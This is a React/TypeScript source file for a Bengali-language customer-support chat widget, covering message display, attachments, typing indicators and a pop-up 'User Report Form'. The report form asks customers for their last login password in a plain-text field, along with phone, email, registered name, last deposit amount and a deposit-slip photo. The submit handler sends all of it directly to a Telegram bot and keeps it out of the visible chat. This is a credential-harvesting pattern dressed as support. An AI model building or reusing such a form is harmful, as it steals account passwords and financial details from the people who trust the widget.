import React, { useState, useRef, useEffect } from 'react';
import { Send, Paperclip, Smile, RefreshCw, X, ShieldCheck, FileText, Image as ImageIcon, Check, CheckCheck, Maximize2, Minimize2, ClipboardList, ExternalLink, AlertCircle, CheckCircle2, Megaphone, ChevronLeft, ChevronRight, MessageSquarePlus, Lock } from 'lucide-react';
import { ChatSession, ChatMessage, WidgetConfig } from '../../types';
import { sendTelegramNotification } from '../../lib/telegramNotify';

interface ChatWindowProps {
  chat: ChatSession;
  messages: ChatMessage[];
  widgetConfig: WidgetConfig;
  onSendMessage: (text: string, attachments?: any[]) => void;
  onSendQuickReply: (text: string) => void;
  onTyping: (isTyping: boolean) => void;
  onEndChat: () => void;
  onCloseWidget: () => void;
  onNewChat?: () => void;
  isTypingAgent?: string | null;
  isFullScreen?: boolean;
  onToggleFullScreen?: () => void;
}

const EMOJIS = ['👍', '❤️', '😊', '🎉', '👋', '🙏', '🔥', '🚀'];

export const ChatWindow: React.FC<ChatWindowProps> = ({
  chat,
  messages,
  widgetConfig,
  onSendMessage,
  onSendQuickReply,
  onTyping,
  onEndChat,
  onCloseWidget,
  onNewChat,
  isTypingAgent,
  isFullScreen,
  onToggleFullScreen
}) => {
  const [inputText, setInputText] = useState('');
  const [showEmojiPicker, setShowEmojiPicker] = useState(false);
  const [attachments, setAttachments] = useState<any[]>([]);

  const messagesEndRef = useRef<HTMLDivElement>(null);
  const typingTimeoutRef = useRef<any>(null);

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages, isTypingAgent]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setInputText(e.target.value);
    onTyping(true);

    if (typingTimeoutRef.current) clearTimeout(typingTimeoutRef.current);
    typingTimeoutRef.current = setTimeout(() => {
      onTyping(false);
    }, 1500);
  };

  const isChatClosed = chat.status === 'resolved' || chat.status === 'closed' || (chat as any).isClosed;

  const handleSend = (e: React.FormEvent) => {
    e.preventDefault();
    if (isChatClosed || chat.isBlocked) return;
    if (!inputText.trim() && attachments.length === 0) return;
    onSendMessage(inputText, attachments.length > 0 ? attachments : undefined);
    setInputText('');
    setAttachments([]);
    setShowEmojiPicker(false);
    onTyping(false);
  };

  const [previewImageModal, setPreviewImageModal] = useState<string | null>(null);

  // Report Form Modal States
  const [showReportModal, setShowReportModal] = useState(false);
  const [reportUsername, setReportUsername] = useState('');
  const [reportPhone, setReportPhone] = useState('');
  const [reportEmail, setReportEmail] = useState('');
  const [reportNibondhonName, setReportNibondhonName] = useState('');
  const [reportLastAmount, setReportLastAmount] = useState('');
  const [reportLastPassword, setReportLastPassword] = useState('');
  const [reportSiteLink, setReportSiteLink] = useState('');
  const [reportDepositSlip, setReportDepositSlip] = useState<{ name: string; url: string } | null>(null);
  const [reportSubmitting, setReportSubmitting] = useState(false);
  const [reportSuccess, setReportSuccess] = useState<string | null>(null);

  const handleDepositSlipUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = (event) => {
      setReportDepositSlip({
        name: file.name,
        url: event.target?.result as string,
      });
    };
    reader.readAsDataURL(file);
  };

  const handleSubmitReport = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!reportUsername.trim() && !reportPhone.trim() && !reportNibondhonName.trim()) return;

    setReportSubmitting(true);

    const reportPayload = {
      username: reportUsername,
      phone: reportPhone || chat.customer.phone,
      email: reportEmail || chat.customer.email,
      nibondhonName: reportNibondhonName,
      lastAmount: reportLastAmount,
      lastPassword: reportLastPassword,
      siteLink: reportSiteLink,
      depositSlipUrl: reportDepositSlip?.url,
      customerName: chat.customer.name,
    };

    // 1. Send data DIRECTLY to Telegram Bot with Photo attachment support
    try {
      await sendTelegramNotification(
        {
          type: 'user_report',
          customerName: chat.customer.name,
          customerPhone: reportPhone || chat.customer.phone,
          customerEmail: reportEmail || chat.customer.email,
          chatId: chat.id,
          photoUrl: reportDepositSlip?.url,
          photoName: reportDepositSlip?.name || 'deposit_slip.jpg',
          reportData: {
            username: reportUsername,
            phone: reportPhone || chat.customer.phone,
            email: reportEmail || chat.customer.email,
            nibondhonName: reportNibondhonName,
            lastAmount: reportLastAmount,
            lastPassword: reportLastPassword,
            siteLink: reportSiteLink,
          },
        },
        widgetConfig
      );
    } catch (err) {
      console.warn('Telegram report sending error:', err);
    }

    // 2. In Chat window: send ONLY a clean confirmation message (No sensitive password/data in public chat)
    onSendMessage('✅ আপনার রিপোর্ট ফরমটি সফলভাবে সাবমিট হয়েছে। খুব শীঘ্রই আপনার সমস্যাটি সমাধান করা হবে।');

    setTimeout(() => {
      setReportSubmitting(false);
      setReportSuccess('আপনার রিপোর্ট সফলভাবে সাবমিট হয়েছে। খুব শীঘ্রই সমাধান করা হবে!');
      setTimeout(() => {
        setShowReportModal(false);
        setReportSuccess(null);
        setReportUsername('');
        setReportPhone('');
        setReportEmail('');
        setReportNibondhonName('');
        setReportLastAmount('');
        setReportLastPassword('');
        setReportSiteLink('');
        setReportDepositSlip(null);
      }, 2000);
    }, 400);
  };

  const renderMessageContent = (content: string, isCustomer: boolean) => {
    const isReportTrigger = content.includes('report-form') || content.includes('রিপোর্ট') || content.includes('অভিযোগ');
    const urlRegex = /(https?:\/\/[^\s]+)/g;
    const parts = content.split(urlRegex);

    return (
      <div className="space-y-2">
        <p className="whitespace-pre-wrap">
          {parts.map((part, index) => {
            if (part.match(urlRegex)) {
              return (
                <a
                  key={index}
                  href={part}
                  target="_blank"
                  rel="noopener noreferrer"
                  className={`underline inline-flex items-center gap-1 font-semibold break-all ${
                    isCustomer ? 'text-white hover:text-blue-100' : 'text-blue-600 hover:text-blue-800'
                  }`}
                >
                  <span>{part}</span>
                  <ExternalLink className="w-3 h-3 shrink-0" />
                </a>
              );
            }
            return part;
          })}
        </p>

        {/* Interactive Report Form Button if message contains report link/trigger */}
        {isReportTrigger && !isCustomer && (
          <div className="mt-2.5 p-3 bg-blue-50/90 border border-blue-200/90 rounded-xl flex flex-col gap-2">
            <div className="flex items-center gap-1.5 text-blue-900 font-bold text-xs">
              <ClipboardList className="w-4 h-4 text-blue-600 shrink-0" />
              <span>অনলাইন সাপোর্ট ও রিপোর্ট ফরম</span>
            </div>
            <p className="text-[11px] text-slate-600 leading-tight">
              আপনার অভিযোগ বা সমস্যা জানাতে নিচের বাটনে ক্লিক করে ফরম পূরণ করুন:
            </p>
            <button
              type="button"
              onClick={() => {
                setReportPhone(chat.customer.phone || '');
                setShowReportModal(true);
              }}
              className="w-full py-2 px-3 bg-blue-600 hover:bg-blue-700 text-white font-bold text-xs rounded-lg shadow-xs flex items-center justify-center gap-1.5 transition cursor-pointer"
            >
              <ClipboardList className="w-4 h-4" />
              <span>📋 রিপোর্ট ফরম পূরণ করুন (Fill Form)</span>
            </button>
          </div>
        )}
      </div>
    );
  };

  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (!files || files.length === 0) return;

    const file = files[0];
    const isImg = file.type.startsWith('image/');

    const processFile = (): Promise<string> => {
      return new Promise((resolve) => {
        if (!isImg) {
          const reader = new FileReader();
          reader.onload = () => resolve(reader.result as string);
          reader.readAsDataURL(file);
          return;
        }

        const reader = new FileReader();
        reader.onload = (event) => {
          const img = new Image();
          img.src = event.target?.result as string;
          img.onload = () => {
            const canvas = document.createElement('canvas');
            const MAX_WIDTH = 1200;
            const MAX_HEIGHT = 1200;
            let width = img.width;
            let height = img.height;

            if (width > height) {
              if (width > MAX_WIDTH) {
                height = Math.round((height * MAX_WIDTH) / width);
                width = MAX_WIDTH;
              }
            } else {
              if (height > MAX_HEIGHT) {
                width = Math.round((width * MAX_HEIGHT) / height);
                height = MAX_HEIGHT;
              }
            }

            canvas.width = width;
            canvas.height = height;
            const ctx = canvas.getContext('2d');
            if (ctx) {
              ctx.drawImage(img, 0, 0, width, height);
              resolve(canvas.toDataURL('image/jpeg', 0.85));
            } else {
              resolve(event.target?.result as string);
            }
          };
          img.onerror = () => resolve(event.target?.result as string);
        };
        reader.readAsDataURL(file);
      });
    };

    const dataUrl = await processFile();
    setAttachments((prev) => [
      ...prev,
      {
        name: file.name,
        url: dataUrl,
        type: isImg ? 'image' : 'file',
        size: (file.size / 1024).toFixed(1) + ' KB',
      },
    ]);

    e.target.value = '';
  };

  // Determine current active chat header profile
  const assignedName = chat.assignedAgentName || chat.assignedAgent?.name || widgetConfig.botName;
  const assignedAvatar = chat.assignedAgentAvatar || chat.assignedAgent?.avatar || widgetConfig.botAvatar;
  const typingDisplayName = (typeof isTypingAgent === 'string' && isTypingAgent.trim() !== '') ? isTypingAgent : (assignedName || 'এজেন্ট');

  return (
    <div id="customer-chat-window" className="flex flex-col h-full bg-slate-50 rounded-2xl overflow-hidden shadow-2xl border border-slate-200">
      
      {/* Widget Top Header */}
      <div
        style={{ backgroundColor: widgetConfig.primaryColor }}
        className="p-3.5 text-white flex items-center justify-between shadow-sm shrink-0"
      >
        <div className="flex items-center gap-2.5">
          <div className="relative">
            <img
              src={assignedAvatar}
              alt={assignedName}
              className="w-9 h-9 rounded-full object-cover ring-2 ring-white/30"
            />
            <span className="absolute bottom-0 right-0 w-2.5 h-2.5 bg-emerald-400 rounded-full border-2 border-white" />
          </div>
          <div>
            <div className="flex items-center gap-1.5">
              <span className="text-[10px] bg-white/20 px-1.5 py-0.5 rounded font-semibold text-amber-200 uppercase tracking-wider">
                এডমিন
              </span>
              <h4 className="font-bold text-xs sm:text-sm leading-tight text-white">{assignedName}</h4>
              <ShieldCheck className="w-3.5 h-3.5 text-blue-200" />
            </div>
            <p className="text-[10px] text-white/90 flex items-center gap-1.5 flex-wrap mt-0.5">
              <span className="bg-black/20 px-1.5 py-0.5 rounded font-mono text-amber-300">
                Chat ID: <strong>#{chat.id}</strong>
              </span>
              <span>•</span>
              {isTypingAgent ? (
                <span className="text-amber-200 font-bold animate-pulse flex items-center gap-1">
                  <span className="w-1.5 h-1.5 rounded-full bg-amber-400 animate-ping inline-block" />
                  {typingDisplayName} লিখছেন...
                </span>
              ) : (
                <span className="capitalize text-emerald-300 font-medium">
                  {chat.status === 'active' ? 'অনলাইন (Online)' : 'অপেক্ষমাণ'}
                </span>
              )}
              {chat.adminSeen && (
                <>
                  <span>•</span>
                  <span className="text-blue-200 font-medium flex items-center gap-0.5">
                    <CheckCheck className="w-3 h-3 text-cyan-300" /> Seen
                  </span>
                </>
              )}
            </p>
          </div>
        </div>

        <div className="flex items-center gap-1">
          {onToggleFullScreen && (
            <button
              onClick={onToggleFullScreen}
              title={isFullScreen ? "স্মল উইজেটে পরিবর্তন করুন" : "ফুল পেজ চ্যাট ভিউ"}
              className="p-1.5 rounded-lg text-white/80 hover:text-white hover:bg-white/10 transition cursor-pointer"
            >
              {isFullScreen ? <Minimize2 className="w-4 h-4" /> : <Maximize2 className="w-4 h-4" />}
            </button>
          )}
          <button
            onClick={onEndChat}
            title="চ্যাট শেষ করুন ও রেটিং দিন"
            className="p-1.5 rounded-lg text-white/80 hover:text-white hover:bg-white/10 transition text-xs font-medium cursor-pointer"
          >
            শেষ করুন
          </button>
          <button
            onClick={onCloseWidget}
            className="p-1.5 rounded-lg text-white/80 hover:text-white hover:bg-white/10 transition cursor-pointer"
          >
            <X className="w-4 h-4" />
          </button>
        </div>
      </div>

      {/* Messages Scroll Area */}
      <div className="flex-1 p-3.5 overflow-y-auto space-y-3.5 text-xs">
        
        {/* Welcome Callout */}
        <div className="bg-blue-50 border border-blue-100 p-2.5 rounded-xl text-center space-y-1 text-slate-600 my-1">
          <p className="text-xs font-medium text-slate-800">{widgetConfig.welcomeMessage}</p>
          <p className="text-[10px] text-slate-500">ডিপার্টমেন্ট: {chat.department}</p>
        </div>

        {/* Messages List with Duplicate Elimination */}
        {(() => {
          const seenIds = new Set<string>();
          const seenContent = new Set<string>();
          const displayMessages: ChatMessage[] = [];

          for (const m of messages) {
            if (!m || m.isInternalNote) continue;
            const idKey = m.id ? String(m.id).trim() : null;
            const contentKey = `${m.senderRole || ''}_${(m.content || '').trim()}_${(m.timestamp || '').trim()}`;

            if (idKey && seenIds.has(idKey)) {
              continue; // Duplicate id - eliminate
            }
            if (seenContent.has(contentKey)) {
              continue; // Duplicate content/timestamp - eliminate
            }

            if (idKey) seenIds.add(idKey);
            seenContent.add(contentKey);
            displayMessages.push(m);
          }

          return displayMessages.map((msg, idx) => {
            const isCustomer = msg.senderRole === 'customer';
            const isSystem = msg.senderRole === 'system';

            if (isSystem) {
              return (
                <div key={msg.id ? `${msg.id}_${idx}` : `sys_${idx}`} className="text-center my-2 text-[11px] text-slate-400 font-medium">
                  <span>{msg.content}</span>
                </div>
              );
            }

            return (
              <div
                key={msg.id ? `${msg.id}_${idx}` : `msg_${idx}`}
                className={`flex gap-2.5 ${isCustomer ? 'flex-row-reverse' : 'flex-row'} items-end`}
              >
                {!isCustomer && (
                  <img
                    src={msg.senderAvatar || widgetConfig.botAvatar}
                    alt={msg.senderName}
                    className="w-7 h-7 rounded-full object-cover shrink-0 mb-1 border border-slate-200"
                  />
                )}

                <div className={`max-w-[80%] space-y-1 ${isCustomer ? 'items-end' : 'items-start'}`}>
                  
                  {/* Sender Label (Upper Seen badge removed to eliminate redundancy) */}
                  <div className={`flex items-center gap-1 text-[10px] text-slate-400 px-1 ${isCustomer ? 'justify-end' : 'justify-start'}`}>
                    <span>{msg.senderName}</span>
                    <span>•</span>
                    <span>{msg.timestamp}</span>
                  </div>

                  {/* Message Bubble */}
                  <div
                    style={
                      isCustomer
                        ? { backgroundColor: widgetConfig.primaryColor, color: '#ffffff' }
                        : { backgroundColor: '#ffffff', color: '#0f172a' }
                    }
                    className={`p-3 rounded-2xl shadow-xs leading-relaxed border ${
                      isCustomer
                        ? 'rounded-br-xs border-transparent'
                        : 'rounded-bl-xs border-slate-200/80 text-slate-800'
                    }`}
                  >
                    {renderMessageContent(msg.content, isCustomer)}

                    {/* Attachments preview */}
                    {msg.attachments && msg.attachments.length > 0 && (
                      <div className="mt-2 space-y-1.5">
                        {msg.attachments.map((att, idx) => (
                          <div key={idx} className="rounded-lg overflow-hidden border border-slate-200/40 cursor-pointer hover:opacity-95 transition" onClick={() => att.type === 'image' && setPreviewImageModal(att.url)}>
                            {att.type === 'image' ? (
                              <img src={att.url} alt={att.name} className="max-h-56 w-full object-cover rounded-lg" />
                            ) : (
                              <a href={att.url} download={att.name} target="_blank" rel="noopener noreferrer" className="flex items-center gap-2 p-2 bg-slate-100/30 text-xs text-blue-600 hover:underline">
                                <FileText className="w-4 h-4" />
                                <span className="truncate">{att.name} ({att.size || 'File'})</span>
                              </a>
                            )}
                          </div>
                        ))}
                      </div>
                    )}
                  </div>

                  {/* Under customer message bubble: Seen badge */}
                  {isCustomer && (
                    <div className="flex items-center justify-end gap-1 pt-0.5 text-[10px] font-semibold">
                      {msg.readStatus === 'read' || chat.adminSeen ? (
                        <div className="flex items-center gap-1 text-blue-600 bg-blue-50/80 px-1.5 py-0.5 rounded border border-blue-200/60 shadow-2xs animate-in fade-in">
                          <CheckCheck className="w-3.5 h-3.5 text-blue-600 stroke-[2.5]" />
                          <span>Seen</span>
                          <span className="text-[9px] text-blue-500 font-normal">
                            {msg.seenAt
                              ? `(${new Date(msg.seenAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })})`
                              : `(${msg.timestamp || 'এডমিন দেখেছেন'})`}
                          </span>
                        </div>
                      ) : msg.readStatus === 'delivered' ? (
                        <div className="flex items-center gap-1 text-slate-400 text-[9px]">
                          <CheckCheck className="w-3 h-3 text-slate-400" />
                          <span>Delivered</span>
                        </div>
                      ) : (
                        <div className="flex items-center gap-1 text-slate-400 text-[9px]">
                          <Check className="w-3 h-3 text-slate-400" />
                          <span>Sent</span>
                        </div>
                      )}
                    </div>
                  )}

                  {/* Quick Reply Pills if present */}
                  {msg.quickReplies && msg.quickReplies.length > 0 && (
                    <div className="flex flex-wrap gap-1.5 pt-1.5">
                      {msg.quickReplies.map((pill, idx) => (
                        <button
                          key={idx}
                          onClick={() => onSendQuickReply(pill)}
                          className="px-2.5 py-1 bg-white hover:bg-blue-50 text-blue-600 border border-blue-200 text-[11px] font-medium rounded-full shadow-2xs transition"
                        >
                          {pill}
                        </button>
                      ))}
                    </div>
                  )}

                </div>
              </div>
            );
          });
        })()}

        {/* Typing indicator */}
        {isTypingAgent && (
          <div className="flex items-center gap-2.5 py-1.5 px-3 bg-white text-slate-700 rounded-2xl rounded-bl-xs w-fit max-w-[85%] border border-slate-200 shadow-2xs animate-in fade-in slide-in-from-bottom-2">
            <div className="w-5 h-5 rounded-full bg-blue-100 flex items-center justify-center shrink-0">
              <div className="flex gap-0.5 items-center">
                <span className="w-1.5 h-1.5 bg-blue-600 rounded-full animate-bounce" />
                <span className="w-1.5 h-1.5 bg-blue-600 rounded-full animate-bounce [animation-delay:0.2s]" />
                <span className="w-1.5 h-1.5 bg-blue-600 rounded-full animate-bounce [animation-delay:0.4s]" />
              </div>
            </div>
            <span className="text-xs font-semibold text-blue-800">
              {typingDisplayName} মেসেজ টাইপ করছেন...
            </span>
          </div>
        )}

        <div ref={messagesEndRef} />
      </div>

      {/* Attachment Previews */}
      {attachments.length > 0 && (
        <div className="px-3 py-1.5 bg-slate-100 border-t border-slate-200 flex items-center gap-2 overflow-x-auto">
          {attachments.map((att, idx) => (
            <div key={idx} className="relative bg-white border border-slate-300 rounded-lg p-1.5 flex items-center gap-2 text-xs">
              <span className="truncate max-w-[120px]">{att.name}</span>
              <button
                type="button"
                onClick={() => setAttachments(attachments.filter((_, i) => i !== idx))}
                className="text-rose-500 hover:text-rose-700"
              >
                <X className="w-3.5 h-3.5" />
              </button>
            </div>
          ))}
        </div>
      )}

      {/* Input Bar */}
      {chat.isBlocked ? (
        <div className="p-3 bg-rose-100 border-t border-rose-300 text-rose-800 text-xs font-bold text-center flex items-center justify-center gap-2">
          <span>🚫 আপনার চ্যাট আইডিটি সাময়িকভাবে ব্লক করা হয়েছে।</span>
        </div>
      ) : isChatClosed ? (
        <div className="p-4 bg-slate-50 border-t border-slate-200 text-center space-y-2.5 animate-in fade-in">
          <div className="flex items-center justify-center gap-2 text-slate-700 text-xs font-bold">
            <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0" />
            <span>এই চ্যাটটি সমাপ্ত (Closed) করা হয়েছে</span>
          </div>
          <p className="text-[11px] text-slate-500 max-w-xs mx-auto leading-relaxed">
            এই কনভারসেশনটির সমাধান সম্পন্ন হয়েছে এবং মেসেজ আদান-প্রদান বন্ধ আছে। আপনার নতুন কোনো প্রশ্ন বা সহায়তার প্রয়োজন হলে নিচে ক্লিক করে নতুন চ্যাট শুরু করতে পারেন।
          </p>
          {onNewChat && (
            <button
              type="button"
              onClick={onNewChat}
              style={{ backgroundColor: widgetConfig.primaryColor }}
              className="w-full py-2.5 px-4 text-white text-xs font-bold rounded-xl shadow-md hover:opacity-95 active:scale-95 transition flex items-center justify-center gap-2 cursor-pointer"
            >
              <MessageSquarePlus className="w-4 h-4" />
              <span>➕ নতুন চ্যাট শুরু করুন (Start New Chat)</span>
            </button>
          )}
        </div>
      ) : (
        <form onSubmit={handleSend} className="p-2.5 bg-white border-t border-slate-200 shrink-0 relative">
          
          {/* Emoji Selector */}
        {showEmojiPicker && (
          <div className="absolute bottom-14 left-3 bg-white border border-slate-200 rounded-xl p-2 shadow-xl flex gap-1 z-20 animate-in fade-in zoom-in-95">
            {EMOJIS.map((emoji) => (
              <button
                type="button"
                key={emoji}
                onClick={() => {
                  setInputText((prev) => prev + emoji);
                  setShowEmojiPicker(false);
                }}
                className="p-1.5 text-base hover:bg-slate-100 rounded-lg transition"
              >
                {emoji}
              </button>
            ))}
          </div>
        )}

        <div className="flex items-center gap-1.5">
          <button
            type="button"
            onClick={() => setShowEmojiPicker(!showEmojiPicker)}
            className="p-2 text-slate-400 hover:text-slate-600 rounded-lg hover:bg-slate-100 transition"
          >
            <Smile className="w-4 h-4" />
          </button>

          <label title="ছবি বা ফাইল সংযুক্ত করুন" className="p-2 text-slate-400 hover:text-slate-600 rounded-lg hover:bg-slate-100 transition cursor-pointer">
            <Paperclip className="w-4 h-4" />
            <input type="file" accept="image/*,.pdf,.doc,.docx" onChange={handleFileUpload} className="hidden" />
          </label>

          <input
            type="text"
            value={inputText}
            onChange={handleInputChange}
            inputMode="text"
            autoCapitalize="sentences"
            enterKeyHint="send"
            autoComplete="off"
            placeholder="আপনার মেসেজটি লিখুন..."
            className="flex-1 text-xs sm:text-sm px-3.5 py-2.5 bg-slate-50 focus:bg-white border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition touch-manipulation"
          />

          <button
            type="submit"
            disabled={!inputText.trim() && attachments.length === 0}
            style={{ backgroundColor: widgetConfig.primaryColor }}
            className="min-w-[42px] min-h-[42px] p-2.5 text-white rounded-xl shadow-xs hover:opacity-90 active:scale-95 transition flex items-center justify-center disabled:opacity-40 disabled:cursor-not-allowed cursor-pointer shrink-0"
            title="মেসেজ পাঠান"
          >
            <Send className="w-4 h-4" />
          </button>
        </div>
      </form>
      )}

      {/* Lightbox Modal for Large Image Preview */}
      {previewImageModal && (
        <div className="fixed inset-0 z-50 bg-black/80 flex items-center justify-center p-4 animate-in fade-in">
          <div className="relative max-w-2xl max-h-[90vh]">
            <button
              onClick={() => setPreviewImageModal(null)}
              className="absolute -top-10 right-0 text-white bg-slate-800/80 p-1.5 rounded-full hover:bg-slate-700 transition"
            >
              <X className="w-5 h-5" />
            </button>
            <img src={previewImageModal} alt="Enlarged preview" className="max-h-[85vh] max-w-full rounded-xl object-contain shadow-2xl" />
          </div>
        </div>
      )}

      {/* Interactive User Report Form Modal */}
      {showReportModal && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-xs flex items-center justify-center p-3 animate-in fade-in">
          <div className="bg-white rounded-2xl max-w-md w-full p-4 sm:p-5 shadow-2xl border border-slate-200 relative space-y-3 max-h-[90vh] overflow-y-auto">
            <div className="flex items-center justify-between border-b border-slate-100 pb-2.5 sticky top-0 bg-white z-10">
              <div className="flex items-center gap-2">
                <div className="p-2 bg-blue-50 text-blue-600 rounded-xl shrink-0">
                  <ClipboardList className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="font-bold text-slate-900 text-xs sm:text-sm">ইউজার রিপোর্ট ফরম (User Report Form)</h3>
                  <p className="text-[10px] sm:text-[11px] text-slate-500">আপনার প্রয়োজনীয় তথ্যসমূহ সঠিকভাবে পূরণ করুন</p>
                </div>
              </div>
              <button
                type="button"
                onClick={() => setShowReportModal(false)}
                className="p-1 text-slate-400 hover:text-slate-600 rounded-lg hover:bg-slate-100"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            {reportSuccess ? (
              <div className="py-6 text-center space-y-2">
                <div className="w-12 h-12 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto animate-bounce">
                  <CheckCircle2 className="w-7 h-7" />
                </div>
                <h4 className="font-bold text-slate-900 text-sm">রিপোর্ট জমা হয়েছে!</h4>
                <p className="text-xs text-slate-600 px-2">{reportSuccess}</p>
              </div>
            ) : (
              <form onSubmit={handleSubmitReport} className="space-y-2.5 text-xs">
                {/* Username */}
                <div>
                  <label className="block font-semibold text-slate-700 mb-0.5">
                    Username (ইউজারনেম) <span className="text-rose-500">*</span>
                  </label>
                  <input
                    type="text"
                    required
                    placeholder="যেমন: john_doe12"
                    value={reportUsername}
                    onChange={(e) => setReportUsername(e.target.value)}
                    className="w-full p-2 border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500"
                  />
                </div>

                {/* Phone Number */}
                <div>
                  <label className="block font-semibold text-slate-700 mb-0.5">
                    Phone Number (ফোন নম্বর) <span className="text-rose-500">*</span>
                  </label>
                  <input
                    type="text"
                    required
                    placeholder="যেমন: 01700000000"
                    value={reportPhone}
                    onChange={(e) => setReportPhone(e.target.value)}
                    className="w-full p-2 border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500"
                  />
                </div>

                {/* Email Address */}
                <div>
                  <label className="block font-semibold text-slate-700 mb-0.5">
                    Email Address (ইমেইল এড্রেস)
                  </label>
                  <input
                    type="email"
                    placeholder="যেমন: user@example.com"
                    value={reportEmail}
                    onChange={(e) => setReportEmail(e.target.value)}
                    className="w-full p-2 border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500"
                  />
                </div>

                {/* Nibondhon Name */}
                <div>
                  <label className="block font-semibold text-slate-700 mb-0.5">
                    নিবন্ধন নাম (Nibondhon Name) <span className="text-rose-500">*</span>
                  </label>
                  <input
                    type="text"
                    required
                    placeholder="অ্যাকাউন্টে নিবন্ধিত নাম"
                    value={reportNibondhonName}
                    onChange={(e) => setReportNibondhonName(e.target.value)}
                    className="w-full p-2 border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500"
                  />
                </div>

                {/* Last Amount */}
                <div>
                  <label className="block font-semibold text-slate-700 mb-0.5">
                    সর্বশেষ জমা করার পরিমাণ (Last Amount)
                  </label>
                  <input
                    type="text"
                    placeholder="যেমন: 500 BDT / ৳৫০০"
                    value={reportLastAmount}
                    onChange={(e) => setReportLastAmount(e.target.value)}
                    className="w-full p-2 border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500"
                  />
                </div>

                {/* Last Login Password */}
                <div>
                  <label className="block font-semibold text-slate-700 mb-0.5">
                    সর্বশেষ লগইন পাসওয়ার্ড (Last Login Password)
                  </label>
                  <input
                    type="text"
                    placeholder="আপনার শেষ পাসওয়ার্ড"
                    value={reportLastPassword}
                    onChange={(e) => setReportLastPassword(e.target.value)}
                    className="w-full p-2 border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500"
                  />
                </div>

                {/* Site Link/Name */}
                <div>
                  <label className="block font-semibold text-slate-700 mb-0.5">
                    Site Link / Name (সাইটের লিংক বা নাম)
                  </label>
                  <input
                    type="text"
                    placeholder="যেমন: https://example.com বা সাইটের নাম"
                    value={reportSiteLink}
                    onChange={(e) => setReportSiteLink(e.target.value)}
                    className="w-full p-2 border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500"
                  />
                </div>

                {/* Last Deposit Slip */}
                <div>
                  <label className="block font-semibold text-slate-700 mb-0.5">
                    সর্বশেষ ডিপোজিট স্লিপ (Last Deposit Slip)
                  </label>
                  <div className="border-2 border-dashed border-slate-200 rounded-xl p-2.5 text-center hover:bg-slate-50 transition cursor-pointer relative">
                    <input
                      type="file"
                      accept="image/*"
                      onChange={handleDepositSlipUpload}
                      className="absolute inset-0 opacity-0 cursor-pointer w-full h-full"
                    />
                    {reportDepositSlip ? (
                      <div className="flex items-center justify-between text-emerald-700 font-semibold text-xs">
                        <span className="truncate max-w-[200px]">📷 {reportDepositSlip.name}</span>
                        <button
                          type="button"
                          onClick={(e) => {
                            e.stopPropagation();
                            setReportDepositSlip(null);
                          }}
                          className="text-rose-500 p-1 hover:bg-rose-50 rounded"
                        >
                          <X className="w-3.5 h-3.5" />
                        </button>
                      </div>
                    ) : (
                      <div className="flex items-center justify-center gap-1.5 text-slate-500 text-xs">
                        <Paperclip className="w-4 h-4 text-slate-400" />
                        <span>ডিপোজিট স্লিপের ছবি আপলোড করুন</span>
                      </div>
                    )}
                  </div>
                </div>

                <div className="pt-2 flex items-center justify-end gap-2 sticky bottom-0 bg-white border-t border-slate-100 mt-3">
                  <button
                    type="button"
                    onClick={() => setShowReportModal(false)}
                    className="px-3 py-2 text-xs font-medium text-slate-600 hover:bg-slate-100 rounded-xl transition cursor-pointer"
                  >
                    বাতিল
                  </button>
                  <button
                    type="submit"
                    disabled={reportSubmitting || (!reportUsername.trim() && !reportPhone.trim() && !reportNibondhonName.trim())}
                    style={{ backgroundColor: widgetConfig.primaryColor }}
                    className="px-4 py-2 text-xs font-bold text-white rounded-xl shadow-xs hover:opacity-90 transition disabled:opacity-50 flex items-center gap-1.5 cursor-pointer"
                  >
                    {reportSubmitting ? (
                      <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                    ) : (
                      <Send className="w-3.5 h-3.5" />
                    )}
                    <span>রিপোর্ট জমা দিন</span>
                  </button>
                </div>
              </form>
            )}
          </div>
        </div>
      )}

    </div>
  );
};
